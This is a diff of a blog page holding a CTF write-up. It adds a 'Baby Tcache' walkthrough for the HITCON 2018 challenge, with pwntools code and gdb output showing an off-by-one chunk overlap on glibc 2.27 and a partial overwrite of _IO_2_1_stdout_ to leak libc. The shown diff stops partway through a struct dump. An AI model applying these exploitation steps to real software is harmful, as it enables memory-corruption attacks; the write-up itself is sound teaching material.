@@ -430,21 +430,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-01-22
+                    2021-02-05
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    2.8k
+                    4.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    17 Min
+                    30 Min
                 </div>
                 
 
@@ -470,6 +470,7 @@
 <hr>
 <h5 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h5><ul>
 <li><strong>Children Tcache</strong> : <a href="https://github.com/D4mianWayne/PwnLand/tree/master/Heap/GLIBC%202.27/Overlapping%20Chunks" target="_blank" rel="noopener">https://github.com/D4mianWayne/PwnLand/tree/master/Heap/GLIBC%202.27/Overlapping%20Chunks</a></li>
+<li><strong>Baby Tcache</strong> : <a href="https://github.com/D4mianWayne/PwnLand/tree/master/Heap/GLIBC%202.27/Overlapping%20Chunks/baby_tcache" target="_blank" rel="noopener">https://github.com/D4mianWayne/PwnLand/tree/master/Heap/GLIBC%202.27/Overlapping%20Chunks/baby_tcache</a></li>
 </ul>
 <hr>
 <p>Now, let’s continue on the challenges.</p>
@@ -722,7 +723,7 @@ log.info('LIBC Base: {}'.format(hex(libc_base)))</code></pre>
 gef➤  x<span class="token operator">/</span>8xg <span class="token number">0x0000555555757770</span> <span class="token operator">-</span> <span class="token number">0x10</span>
 <span class="token number">0x555555757760</span><span class="token operator">:</span>    <span class="token number">0x0065656565656565</span>    <span class="token number">0x0000000000000671</span>  <span class="token operator">&lt;-</span><span class="token operator">-</span><span class="token operator">-</span> the <span class="token number">0x671</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x600</span> <span class="token operator">+</span> <span class="token number">0x71</span><span class="token punctuation">)</span> is consolidated and <span class="token keyword">for</span> which after the allocation the fd <span class="token operator">&amp;</span> bk is populated
 <span class="token number">0x555555757770</span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dcdca0</span>    <span class="token number">0x00007ffff7dcdca0</span></code></pre>
-<p>The roppy’s output:-</p>
+<p>Having the leak:-</p>
 <pre class=" language-r"><code class="language-r">vagrant<span class="token operator">@</span>ubuntu<span class="token operator">-</span>bionic<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>sharedFolder<span class="token operator">/</span>training<span class="token operator">/</span>hitcon<span class="token operator">$</span> python3 children_tcache.py
 <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./children_tcache'</span><span class="token operator">:</span> pid <span class="token number">2842</span>
 <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> LIBC Base<span class="token operator">:</span> <span class="token number">0x7ffff79e2000</span>
@@ -814,6 +815,280 @@ Pwned
 <span class="token operator">$</span> 
 <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Interrupted</code></pre>
 <p>This was an interesting challenge.</p>
+<h1 id="Baby-Tcache"><a href="#Baby-Tcache" class="headerlink" title="Baby Tcache"></a>Baby Tcache</h1><p>This was another challenge proposed in the HITCON 2018 as a part of the pwn category, although the general idea for the exploit was same but the catch here was the <code>show</code> function was not there anymore, this made the approach to this challenge significantly harder than the Children Tcache. In order to pwn the binary, we have to get the LIBC address but since there is no <code>show</code>, we will take the advantage of the <code>stodut</code> structure, in order to get leak of the LIBC address, we will first understand the <code>_IO_2_1_stdout_</code>, so let’s delve into it without wasting any time.</p>
+<p>To save the time, we are not going to reverse engineering the binary since it is same as of the <code>children tcache</code>, the only difference is that this binary doesn’t have <code>show</code> function making considerably harder for the LIBC leak <strong>but not impossible</strong>.</p>
+<blockquote>
+<p>The address might be different in the snippets but the core principle is same, ASLR was on during the test as well, so the address randomization could be seen.</p>
+</blockquote>
+<p>Using the same wrapper function from the previous challenge:-</p>
+<pre class=" language-py"><code class="language-py">from pwn import *
+
+p = process("./baby_tcache")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+def add(size,data,val=1):
+        s.recvuntil("Your choice: ")
+        s.sendline(str(1))
+        s.recvuntil("Size:")
+        s.sendline(str(size))
+        ret = s.recvuntil("Data:",timeout=5)
+        if ret == "":
+            exit()
+        if(val):
+            s.sendline((data))
+        else:
+            s.send((data))
+
+def free(idx):
+        s.recvuntil("Your choice: ")
+        s.sendline(str(2))
+        s.recvuntil("Index:")
+        s.sendline(str(idx))</code></pre>
+<p>We will follow the same approach, this being said, as we did in the above challenge, we overlapped two chunks such that the <code>main_arena</code> address was populated to the allocated chuk as from the <code>heap_list</code> making us to leak the addresses, this time since we don’t have a <code>show</code> function, we will overwrite the last few bits of the populated address such that it points to the <code>_IO_2_1_stdout_</code> so that the <code>fd</code> of the <code>free</code>‘d chunk from the <code>unsorted</code> bin would point to the <code>_IO_2_1_stdout_</code> such that it’d be return to us upon next allocation.</p>
+<p>Now, we will alllocate the chunk of following size, usually the ones which will go to either the <code>tcache</code> bin or the <code>unsorted</code> bin:-</p>
+<pre class=" language-py"><code class="language-py">
+ # heap_chunks[0] ==> size 0x500
+add(0x4f0,"a"*0x8,1)
+# heap_chunks[1] ==> size 0x070
+add(0x60,"b"*8)
+# heap_chunks[2] ==> size 0x40
+add(0x30,"a"*8)
+# heap_chunks[3] ==> size 0x20
+add(0x10,"a"*8)
+# heap_chunks[4] ==> size 0x500
+add(0x4f0,"b"*8,0)
+# heap_chunks[5] ==> size 0x20
+add(0x10,"a"*8)</code></pre>
+<p>Now, here we allocated the <code>chunk[0]</code> and <code>chunk[4]</code> in an unsorted bin range and the rest of them usually belongs to the <code>tcache</code> bin range. Now, what we will do here is, free the <code>chunk[3]</code> of size <code>0x10</code> and then allocate a chunk of size <code>0x18</code> but at the same it’ll belong to the bin of the <code>0x20</code>, the same chunk will be returned. When that will happen, since the actual size we allocated and we are allowed to write to will be of size <code>0x18</code> allowing us to write into the metadata and if we will look at the layout of the chunk:-</p>
+<pre class=" language-r"><code class="language-r">The <span class="token number">0x20</span> chunk
+
+<span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>
+<span class="token operator">|</span>   <span class="token number">0x00</span>      <span class="token operator">|</span>  <span class="token number">0x00</span>     <span class="token operator">|</span> <span class="token operator">-</span><span class="token operator">-></span> <span class="token number">0x10</span>
+<span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>
+<span class="token operator">|</span>  prev_size  <span class="token operator">|</span>   size    <span class="token operator">|</span> <span class="token operator">-</span><span class="token operator">-></span> <span class="token number">0x10</span> 
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+
+After we edit the metadata of the chunk
+
+<span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>
+<span class="token operator">|</span>  <span class="token number">0x00</span>       <span class="token operator">|</span> <span class="token number">0x00</span>     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>
+<span class="token operator">|</span> <span class="token number">0x5d0</span>       <span class="token operator">|</span> <span class="token number">0x501</span>    <span class="token operator">|</span> <span class="token operator">-</span><span class="token operator">-></span> heap_chunks<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> size
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></code></pre>
+<p>Now, what will happen here is we will trigger the off by one vulnerability and as well as the <code>prev_size</code> this will result in the chunk layout being:-</p>
+<pre class=" language-r"><code class="language-r"><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>
+<span class="token operator">|</span>  <span class="token number">0x00</span>       <span class="token operator">|</span> <span class="token number">0x00</span>     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>
+<span class="token operator">|</span> <span class="token number">0x5d0</span>       <span class="token operator">|</span> <span class="token number">0x500</span>    <span class="token operator">|</span> 
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></code></pre>
+<p>So, when we look at it ourselves in the gdb:-</p>
+<pre class=" language-py"><code class="language-py">free(3)
+add(0x18,p64(0x00) *2 + p64(0x5d0),0)</code></pre>
+<p>The chunk layout in the memory will be:-</p>
+<pre class=" language-r"><code class="language-r">gef➤  x<span class="token operator">/</span>40xg <span class="token number">0x0000555df391c810</span>
+<span class="token number">0x555df391c810</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x555df391c820</span><span class="token operator">:</span>    <span class="token number">0x00000000000005d0</span>    <span class="token number">0x0000000000000500</span></code></pre>
+<p>So, now when we will free the <code>chunk[0]</code> and <code>chunk[4]</code>:-</p>
+<pre class=" language-py"><code class="language-py">free(0)
+free(4)</code></pre>
+<p>Running so:-</p>
+<pre class=" language-r"><code class="language-r">gef➤  heap bins unsorted
+────────────────────────────────── Unsorted Bin <span class="token keyword">for</span> arena <span class="token string">'main_arena'</span> ──────────────────────────────────
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> unsorted_bins<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">:</span> fw<span class="token operator">=</span><span class="token number">0x55dd71e62250</span><span class="token punctuation">,</span> bk<span class="token operator">=</span><span class="token number">0x55dd71e62250</span>
+ →   Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x55dd71e62260</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0xad0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found <span class="token number">1</span> chunks <span class="token keyword">in</span> unsorted bin.
+gef➤  p<span class="token operator">/</span>x <span class="token number">0x500</span> <span class="token operator">+</span> <span class="token number">0x5d0</span>
+<span class="token operator">$</span><span class="token number">4</span> <span class="token operator">=</span> <span class="token number">0xad0</span>
+gef➤  </code></pre>
+<p>Now, the total size of the chunk belongs to the <code>unsorted</code> bin is <code>0xad0</code> is the summation of the <code>0x500</code> and the size we gave it as the <code>0x5d0</code>, hence <code>0xad0</code>. But at the same time when we see the whole heap layout, it turns out to be like this:-</p>
+<pre class=" language-r"><code class="language-r">gef➤  heap chunks
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x55dd71e62010</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x250</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x000055dd71e62010</span>     <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>    <span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span>.<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x55dd71e62260</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0xad0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x000055dd71e62260</span>     a0 6c <span class="token number">50</span> 9e d4 7f <span class="token number">00</span> <span class="token number">00</span> a0 6c <span class="token number">50</span> 9e d4 7f <span class="token number">00</span> <span class="token number">00</span>    .lP<span class="token ellipsis">...</span><span class="token ellipsis">...</span>lP<span class="token ellipsis">...</span>..<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x55dd71e62d30</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x000055dd71e62d30</span>     <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>    aaaaaaaa<span class="token ellipsis">...</span><span class="token ellipsis">...</span>..<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x55dd71e62d50</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x202c0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>  ←  top chunk
+gef➤  
+</code></pre>
+<p>If you pay attention, we had almost 6 chunks allocated in which we <code>free</code>‘d 2 of them, that leaves the 4 of them allocated, but as the <code>gef</code> output we can definitely see only two chunks here referenced, first is the one we <code>free</code>‘d and went into the unsorted bin and other one is the last chunk we allocated to prevent the <code>top_chunk</code> consolidation. But when we look at the gloabal array which keeps the track of the allocated chunks,</p>
+<pre class=" language-r"><code class="language-r">gef➤  x<span class="token operator">/</span>30xg <span class="token number">0x55dd713f3050</span>
+<span class="token number">0x55dd713f3050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x55dd713f3060</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x000055dd71e62760</span>
+<span class="token number">0x55dd713f3070</span><span class="token operator">:</span>    <span class="token number">0x000055dd71e627d0</span>    <span class="token number">0x000055dd71e62810</span>
+<span class="token number">0x55dd713f3080</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x000055dd71e62d30</span></code></pre>
+<p>It shows we have 4 allocated chunks, this shows that the <code>chunk[1]</code> and the <code>chunk[2]</code> and the <code>chunk[3]</code> now is within the <code>unsorted</code> bin chunk. It overlaps the chunks contigously laid out. So, now we will <code>free</code> the <code>chunk[1]</code> and the <code>chunk[3]</code>:-</p>
+<pre class=" language-py"><code class="language-py">free(1)
+free(3)</code></pre>
+<p>Checking the bins and the heap chunks layout:-</p>
+<pre class=" language-r"><code class="language-r">gef➤  x<span class="token operator">/</span>400xg <span class="token number">0x5623a643c250</span>
+<span class="token number">0x5623a643c250</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000ad1</span>
+<span class="token number">0x5623a643c260</span><span class="token operator">:</span>    <span class="token number">0x00007fda26360ca0</span>    <span class="token number">0x00007fda26360ca0</span>
+<span class="token number">0x5623a643c270</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+
+             <span class="token punctuation">[</span>..snip..<span class="token punctuation">]</span>
+
+<span class="token number">0x5623a643c750</span><span class="token operator">:</span>    <span class="token number">0x0000000000000500</span>    <span class="token number">0x0000000000000070</span>
+<span class="token number">0x5623a643c760</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x00005623a643c010</span>
+<span class="token number">0x5623a643c770</span><span class="token operator">:</span>    <span class="token number">0xdadadadadadadada</span>    <span class="token number">0xdadadadadadadada</span>
+<span class="token number">0x5623a643c780</span><span class="token operator">:</span>    <span class="token number">0xdadadadadadadada</span>    <span class="token number">0xdadadadadadadada</span>
+<span class="token number">0x5623a643c790</span><span class="token operator">:</span>    <span class="token number">0xdadadadadadadada</span>    <span class="token number">0xdadadadadadadada</span>
+<span class="token number">0x5623a643c7a0</span><span class="token operator">:</span>    <span class="token number">0xdadadadadadadada</span>    <span class="token number">0xdadadadadadadada</span>
+<span class="token number">0x5623a643c7b0</span><span class="token operator">:</span>    <span class="token number">0xdadadadadadadada</span>    <span class="token number">0xdadadadadadadada</span>
+<span class="token number">0x5623a643c7c0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000041</span>
+<span class="token number">0x5623a643c7d0</span><span class="token operator">:</span>    <span class="token number">0x6161616161616161</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x5623a643c7e0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x5623a643c7f0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x5623a643c800</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000021</span>
+<span class="token number">0x5623a643c810</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x00005623a643c010</span>
+<span class="token number">0x5623a643c820</span><span class="token operator">:</span>    <span class="token number">0xdadadadadadadada</span>    <span class="token number">0x0000000000000500</span>
+<span class="token number">0x5623a643c830</span><span class="token operator">:</span>    <span class="token number">0xdadadadadadadada</span>    <span class="token number">0xdadadadadadadada</span>
+
+             <span class="token punctuation">[</span>..snip..<span class="token punctuation">]</span>
+
+<span class="token number">0x5623a643cd20</span><span class="token operator">:</span>    <span class="token number">0x0000000000000ad0</span>    <span class="token number">0x0000000000000020</span>
+<span class="token number">0x5623a643cd30</span><span class="token operator">:</span>    <span class="token number">0x6161616161616161</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x5623a643cd40</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x00000000000202c1</span></code></pre>
+<p>Now, if we do pay attention the <code>chunk[1]</code> and the <code>chunk[3]</code> which we <code>free</code>‘d a moment ago is within the chunk we <code>free</code>‘d with the extended size, resulting in the overlap. Now, we will just allocate a chunk of size <code>0x4f0</code> giving the chunk <code>0x500</code> from the <code>unsorted</code> bin and then again allocating a chunk of size <code>0x90</code> and this time, we will get a chunk from the <code>unsorted</code> bin, since the given chunk will have it’s <code>fd</code> and <code>bk</code> populated with the <code>main_arena</code>, we will attempt to write the last 4 bits of the <code>fd</code> address such that it would point to the <code>_IO_2_1_stdout-&gt;flags</code>:-</p>
+<pre class=" language-py"><code class="language-py">add(0x4f0,"a")
+
+# partial overwrite to stdout->_flags
+
+add(0x90,b"\x60\x07",0)</code></pre>
+<p>Doing that so, we get the <code>_IO_2_1_stdout_</code> address populated to the <code>heap_chunks</code> global array at the index <code>3</code>, this happened because when we allocated the chunk of size <code>0x4f0</code> that made the all the chunks which we <code>free</code>‘d belonging to the <code>tcache</code> bin as they overlapped into the <code>unsorted</code> bin result in the <code>free</code>‘d chunks also being populated with the <code>main_arena</code> address. So, when we allocate a chunk of size <code>0x90</code> will be given from the <code>unsorted</code> bin, from the overlapped region, hence we could overwrite the last 4 bits of the address and made it point to the <code>_IO_2_1_stdout_</code>:-</p>
+<pre class=" language-r"><code class="language-r">gef➤  x<span class="token operator">/</span>10xg <span class="token number">0x56431531d050</span>
+<span class="token number">0x56431531d050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x56431531d060</span><span class="token operator">:</span>    <span class="token number">0x0000564316c8f260</span>    <span class="token number">0x0000564316c8f760</span>
+<span class="token number">0x56431531d070</span><span class="token operator">:</span>    <span class="token number">0x0000564316c8f7d0</span>    <span class="token number">0x0000564316c8f760</span>
+<span class="token number">0x56431531d080</span><span class="token operator">:</span>    <span class="token number">0x00007fa0293a0760</span>    <span class="token number">0x0000564316c8fd30</span>
+<span class="token number">0x56431531d090</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+gef➤  p <span class="token operator">&amp;</span>_IO_2_1_stdout_ 
+<span class="token operator">$</span><span class="token number">51</span> <span class="token operator">=</span> <span class="token punctuation">(</span>struct _IO_FILE_plus <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0x7fa0293a0760</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">></span></code></pre>
+<p>Now, what we will do here is make the <code>flag</code> to be <code>0xfbad1800</code> and the associating member of the <code>struct</code> to be of the NULL, hence resulting in the next <code>puts</code> call, which will call the <code>_IO_new_file_xsputn</code> hence, giving a huge buffer dump:-</p>
+<pre class=" language-r"><code class="language-r">gef➤  p _IO_2_1_stdout_ 
+<span class="token operator">$</span><span class="token number">52</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
+  file <span class="token operator">=</span> <span class="token punctuation">{</span>
+    _flags <span class="token operator">=</span> <span class="token number">0xfbad1800</span><span class="token punctuation">,</span> 
+    _IO_read_ptr <span class="token operator">=</span> <span class="token number">0x7fa0293a07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+    _IO_read_end <span class="token operator">=</span> <span class="token number">0x7fa0293a07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+    _IO_read_base <span class="token operator">=</span> <span class="token number">0x7fa0293a07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+    _IO_write_base <span class="token operator">=</span> <span class="token number">0x7fa0293a07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+    _IO_write_ptr <span class="token operator">=</span> <span class="token number">0x7fa0293a07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+    _IO_write_end <span class="token operator">=</span> <span class="token number">0x7fa0293a07e4</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">132</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_buf_base <span class="token operator">=</span> <span class="token number">0x7fa0293a07e3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+    _IO_buf_end <span class="token operator">=</span> <span class="token number">0x7fa0293a07e4</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">132</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_save_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_backup_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_save_end <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _markers <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _chain <span class="token operator">=</span> <span class="token number">0x7fa02939fa00</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">></span><span class="token punctuation">,</span> 
+    _fileno <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">,</span> 
+    _flags2 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _old_offset <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">,</span> 
+    _cur_column <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _vtable_offset <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _shortbuf <span class="token operator">=</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> 
+    _lock <span class="token operator">=</span> <span class="token number">0x7fa0293a18c0</span> <span class="token operator">&lt;</span>_IO_stdfile_1_lock<span class="token operator">></span><span class="token punctuation">,</span> 
+    _offset <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">,</span> 
+    _codecvt <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _wide_data <span class="token operator">=</span> <span class="token number">0x7fa02939f8c0</span> <span class="token operator">&lt;</span>_IO_wide_data_1<span class="token operator">></span><span class="token punctuation">,</span> 
+    _freeres_list <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _freeres_buf <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    __pad5 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _mode <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> 
+    _unused2 <span class="token operator">=</span> <span class="token string">'\000'</span> <span class="token operator">&lt;</span>repeats <span class="token number">19</span> times<span class="token operator">></span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span> 
